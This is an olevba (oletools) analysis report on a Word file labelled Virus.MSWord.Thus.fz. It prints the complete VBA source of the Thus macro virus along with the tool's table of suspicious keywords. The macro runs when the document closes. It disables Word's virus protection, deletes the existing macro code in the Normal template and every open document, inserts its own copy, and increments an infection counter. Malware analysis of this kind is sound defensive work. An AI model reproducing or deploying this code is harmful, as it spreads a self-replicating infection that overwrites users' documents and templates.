olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.fz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: ./Virus.MSWord.Thus.fz - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_close()
'Thus_001'
'Anti-Smyser'
'Infection
' Infection no 5678
'
    On Error Resume Next
    Application.Options.VirusProtection = False
        
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'Infection" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) = "'Infection" Then
        nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(5, 1)
        nt = Mid(nt, 15)
        nt0 = Val(nt)
        nt = "' Infection no" + Str(nt0)
    End If
        
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) <> "'Infection" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
        
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1) = "'Infection" Then
            ad = Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(5, 1)
            ad = Mid(ad, 15)
            ad0 = Val(ad) + 1
            ad = "' Infection no" + Str(ad0)
            
            If ad0 >= nt0 Then
                Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 5, ad
                NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 5, ad
            Else
                Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 5, nt
                NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 5, nt
            End If
            
        If ActiveDocument.Saved = False Then ActiveDocument.Save
        If NormalTemplate.Saved = False Then NormalTemplate.Save
        
        End If

    Next k
End Sub



































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

